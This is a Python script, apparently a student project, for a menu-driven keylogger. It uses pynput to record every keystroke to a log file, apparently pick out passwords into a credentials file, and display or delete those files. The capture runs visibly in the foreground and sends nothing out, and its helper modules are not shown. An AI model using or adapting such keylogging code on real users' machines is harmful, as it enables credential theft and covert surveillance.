#!/bin/python3.10

from pynput.keyboard import Listener
from os import system, remove
import sys
from ft_validateNumber import validateNumber
from ft_readFile import *
from ft_saveInFile import saveInFile
from ft_detectEIPassword import detectEIPassword
from ft_deleteFile import deleteFile


'''
 Function that shows a menu on the screen to the user
 To store the password in the credentials.txt file, press CTRL+ESC
'''

def menu():

    system("clear")
    print("+============= MENU =============+")
    print("|        ESC to back menu        |")
    print("|1. recordKey                    |")
    print("|2. readLogs                     |")
    print("|3. readCredentials              |")
    print("|4. delete credentials.txt       |")
    print("|5. delete keylog.txt            |")
    print("|6. Exit                         |")
    print("+================================+")

    option = validateNumber()
    if (option > 0 and option < 7):
        if option == 1:
            with Listener(on_press=recordKey) as listener:
                listener.join()
        elif option == 2:
            readLogs()
            with Listener(on_press=escapeKey) as listener:
                listener.join()
        elif option == 3:
            readCredentials()
            with Listener(on_press=escapeKey) as listener:
                listener.join()
        elif option == 4:
            deleteFile('credentials.txt')
            with Listener(on_press=escapeKey) as listener:
                listener.join()
        elif option == 5:
            deleteFile('keylog.txt')
            with Listener(on_press=escapeKey) as listener:
                listener.join()
        elif option == 6:
            print("Exit. Thanks for use this program")
    else:
        print("\nError, enter a number between 1 - 6\n")
        menu()

'''
Function to capture keyboard events
'''

def recordKey(key):
    key=str(key)
    printDataConsole(key)
    if key == 'Key.esc':
        detectEIPassword()
        sys.stdout.flush()
        menu()
        return False
    saveInFile(key)

'''
Function to capture escape events
'''

def escapeKey(key):
    key=str(key)
    if key == 'Key.esc':
        sys.stdout.flush()
        menu()
        return False


'''
Function to display the text on the screen
'''

def printDataConsole(key):
    key = str(key)
    print("Captured Key: " +key)


'''
Principal function
'''

if __name__=='__main__':
    menu()
